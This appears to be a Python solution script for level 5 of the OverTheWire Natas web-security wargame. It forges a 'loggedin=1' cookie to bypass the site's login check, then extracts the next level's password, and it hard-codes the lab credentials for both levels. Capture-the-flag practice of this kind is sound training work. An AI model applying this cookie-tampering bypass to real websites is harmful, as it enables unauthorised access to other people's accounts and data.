import requests
import bs4
import re


# configuration for natas5
USERNAME = 'natas5'
PASSWORD = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'
URL = 'http://natas5.natas.labs.overthewire.org/'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)


response = requests.get(URL, auth=AUTH)
soup = bs4.BeautifulSoup(response.text, 'html.parser')
div_content = soup.find('body').find('div', {'id' : 'content'})
print(f'{div_content}\n')


print(f'{response.cookies}')


# we can't gain access as the site says that we aren't logged in
# going through the request header, we can see that there is a cookie
# loggedin=0
# let's try to set it to 1, i.e. loggedin=1
response = requests.get(URL, auth=AUTH, cookies={'loggedin' : '1'})
soup = bs4.BeautifulSoup(response.text, 'html.parser')
div_content = soup.find('body').find('div', {'id' : 'content'})
print(f'{div_content}\n')


# natas6 password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
password = re.search(r'is (\w+)', str(div_content)).group(1)
print(f'natas6 password: {password}')